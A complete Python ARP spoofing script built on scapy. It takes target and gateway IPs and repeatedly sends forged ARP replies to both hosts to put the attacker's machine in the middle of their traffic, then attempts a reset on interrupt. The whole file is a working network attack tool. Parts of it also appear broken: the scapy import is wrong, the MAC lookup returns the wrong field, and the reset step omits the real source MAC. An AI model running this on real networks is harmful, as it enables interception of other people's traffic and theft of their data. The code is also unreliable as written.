import scapy
import optparse;
import subprocess;
import re;
import time
parse_object = optparse.OptionParser();


def get_mac_address(ip):

    arp_request_pack = scapy.ARP(pdst=ip)
    broadcast_request_pack = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    request_pack = broadcast_request_pack / arp_request_pack;

    answered_list = scapy.srp(request_pack,timeout=1,verbose = False)[0]
    # verbose konsola send 1 packet gibi yazilar (rapor vermesini onler).
    return answered_list[0][1].hwdst;

def arp_poison(target_ip,poisoned_ip):

    target_mac = get_mac_address(target_ip)

    request_pack = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=poisoned_ip)
    scapy.send(request_pack,verbose=False);

def reset_operation(fooled_ip,gateway_ip):

    target_mac = get_mac_address(fooled_ip)
    gateway_mac = get_mac_address(gateway_ip)
    request_pack = scapy.ARP(op=2,pdst=fooled_ip,hwdst=target_mac,psrc=gateway_ip)
    scapy.send(request_pack,verbose=False,count=6);

def get_user_input():
    parse_object.add_option("-t","--target_ip",dest="target_ip",help="Enter the target ip");
    parse_object.add_option("-g","--gateway_ip",dest="gateway_ip",help="Enter the gateway ip");

    (options,arguments) = parse_object.parse_args();

    if not options.target_ip:
        print("Enter target ip")
    if not options.gateway_ip:
        print("Enter gateway ip");
    return options

ip_input = get_user_input()
user_target_ip = ip_input.target_ip;
user_gateway_ip = ip_input.gateway_ip;


try:
    package_number = 0
    while True:

        arp_poison(user_target_ip,user_gateway_ip);
        arp_poison(user_gateway_ip,user_target_ip);
        package_number+=2
        print("packages sending ..." + str(package_number))
        time.sleep(3)

except KeyboardInterrupt:
    print("\nQuit & Reset")
    reset_operation(user_target_ip,user_gateway_ip)
    reset_operation(user_gateway_ip,user_target_ip)


